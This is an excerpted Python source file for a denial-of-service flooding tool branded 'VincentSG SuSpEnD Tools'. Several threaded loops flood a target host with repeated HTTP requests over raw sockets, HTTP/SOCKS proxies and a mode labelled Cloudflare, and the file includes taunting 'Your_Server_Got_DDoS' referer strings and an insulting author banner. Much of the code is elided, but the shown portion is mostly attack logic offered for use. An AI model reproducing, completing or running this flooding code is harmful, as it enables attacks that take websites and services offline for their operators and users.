...
ref = ['Your_Server_Got_DDoS_By_VincentSG_Never_Surrender_Boys_!',
'Your_Server_Got_DDoS_By_VincentSG_Never_Surrender_Boys_!',
'Your_Server_Got_DDoS_By_VincentSG_Never_Surrender_Boys_!',
'Your_Server_Got_DDoS_By_VincentSG_Never_Surrender_Boys_!',
'Your_Server_Got_DDoS_By_VincentSG_Never_Surrender_Boys_!',
'Your_Server_Got_DDoS_By_VincentSG_Never_Surrender_Boys_!',
...
os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title SuSpENd By JyaiboyDW")
...
def logo():
    ...
    print(" [+]=============== [TOOLS CODE BY jyaiboy]   ===============[+]")
    print(" [+]=============== [AUTHOR:jyaiboy]              ===============[+]")
    print(" [+]=============== [NOTE:DONT LEAK TOOLS! ya dumb cunts]     ===============[+]")                                                                                            
...
def numthreads():
    ...
    try:
        ...
        threads = int()
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] VincentSG SuSpEnD Tools Attack | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                #req_code += 1
                #sys.stdout.write("[!] VincentSG SuSpEnD Tools Attack | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                print("[!] VincentSG SuSpEnD Tools Attack | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[!] VincentSG SuSpEnD Tools Attack | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[!] VincentSG SuSpEnD Tools Attack | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] VincentSG SuSpEnD Tools Attack | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[!] VincentSG SuSpEnD Tools Attack | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] VincentSG SuSpEnD Tools Attack | cLouDfLAre @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
